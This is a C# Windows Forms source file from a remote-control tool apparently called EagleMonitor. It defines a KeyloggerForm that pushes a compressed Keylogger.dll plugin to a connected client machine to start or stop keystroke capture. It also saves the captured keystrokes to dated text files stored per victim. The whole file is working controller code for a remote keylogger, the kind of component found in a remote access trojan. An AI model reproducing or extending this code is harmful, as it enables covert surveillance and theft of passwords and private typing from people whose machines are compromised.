using EagleMonitor.Controls;
using EagleMonitor.Networking;
using PacketLib;
using PacketLib.Packet;
using System;
using System.IO;
using System.Windows.Forms;

namespace EagleMonitor.Forms
{
    public partial class KeyloggerForm : FormPattern
    {
        internal ClientHandler clientHandler { get; set; }
        public bool hasAlreadyConnected { get; set; }
        private string baseIp { get; set; }
        internal KeyloggerForm(string baseIp)
        {
            //this.clientHandler = clientHandler;
            this.baseIp = baseIp;
            InitializeComponent();
        }

        private void KeyloggerForm_Load(object sender, EventArgs e)
        {
            this.startKeylogGuna2Button.Enabled = false;
            this.startKeylogGuna2Button.Text = "Keylogger already enabled !";
        }

        private void stopKeylogGuna2Button_Click(object sender, EventArgs e)
        {
            if (clientHandler != null && hasAlreadyConnected == true)
            {
                KeylogPacket keylogPacket = new KeylogPacket(clientHandler.IP, clientHandler.HWID);
                keylogPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Keylogger.dll"), 1);
                clientHandler.SendPacket(keylogPacket);
            }
            hasAlreadyConnected = false;
            this.startKeylogGuna2Button.Enabled = true;
            this.startKeylogGuna2Button.Text = "Start Keylogger";
        }

        private void startKeylogGuna2Button_Click(object sender, EventArgs e)
        {
            KeylogPacket keylogPacket = new KeylogPacket();
            keylogPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Keylogger.dll"), 1);
            ClientHandler.ClientHandlersList[baseIp].SendPacket(keylogPacket);
            this.startKeylogGuna2Button.Enabled = false;
            this.startKeylogGuna2Button.Text = "Keylogger already enabled !";
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            if (clientHandler != null && hasAlreadyConnected == true)
            {
                KeylogPacket keylogPacket = new KeylogPacket(clientHandler.IP, clientHandler.HWID);
                keylogPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Keylogger.dll"), 1);
                clientHandler.SendPacket(keylogPacket);
            }

            Directory.CreateDirectory(ClientHandler.ClientHandlersList[baseIp].clientPath + "\\Keystrokes\\");
            File.WriteAllText(ClientHandler.ClientHandlersList[baseIp].clientPath + "\\Keystrokes\\"  + Utils.Miscellaneous.DateFormater() + ".txt", keystrokeRichTextBox.Text);
            hasAlreadyConnected = false;
            this.startKeylogGuna2Button.Enabled = true;
            this.startKeylogGuna2Button.Text = "Start Keylogger";
            this.Close();
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }
    }
}
